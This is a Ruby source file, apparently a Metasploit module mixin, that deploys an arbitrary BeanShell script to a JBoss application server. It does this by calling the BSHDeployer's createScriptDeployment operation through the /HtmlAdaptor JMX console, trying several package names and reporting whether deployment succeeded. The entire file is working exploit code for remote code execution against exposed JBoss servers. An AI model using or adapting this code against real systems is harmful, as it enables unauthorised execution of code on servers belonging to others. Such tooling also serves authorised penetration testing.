# -*- coding: binary -*-
module Msf::HTTP::JBoss::BeanShell

  DEFAULT_PACKAGES = %w{ deployer scripts }

  def deploy_bsh(bsh_script)
    package = nil

    if datastore['PACKAGE'].blank?
      packages = DEFAULT_PACKAGES
    else
      packages = [ datastore['PACKAGE'] ]
    end

    packages.each do |p|
      if deploy_package(bsh_script, p)
        return p
      end
    end

    package
  end

  def deploy_package(bsh_script, package)
    success = false

    print_status("Attempting to use '#{package}' as package")
    res = invoke_bsh_script(bsh_script, package)

    if res.nil?
      print_error("Unable to deploy WAR [No Response]")
    elsif res.code < 200 || res.code >= 300
      case res.code
      when 401
        print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
      else
        print_error("Unable to deploy BSH script [#{res.code} #{res.message}]")
      end
    else
      success = true
    end

    success
  end

  # Invokes +bsh_script+ on the JBoss AS via BSHDeployer
  def invoke_bsh_script(bsh_script, pkg)
    params =  { }
    params.compare_by_identity
    params['action']     = 'invokeOpByName'
    params['name']       = "jboss.#{pkg}:service=BSHDeployer"
    params['methodName'] = 'createScriptDeployment'
    params['argType']    = 'java.lang.String'
    params['arg0']       = bsh_script #Rex::Text.uri_encode(bsh_script)
    params['argType']    = 'java.lang.String'
    params['arg1']       = Rex::Text.rand_text_alphanumeric(8+rand(8)) + '.bsh'

    opts = {
      'method'	=> http_verb,
      'uri'    => normalize_uri(target_uri.path.to_s, '/HtmlAdaptor')
    }

    if http_verb == 'POST'
      opts.merge!('vars_post' => params)
    else
      opts.merge!('vars_get' => params)
    end

    send_request_cgi(opts)
  end

end
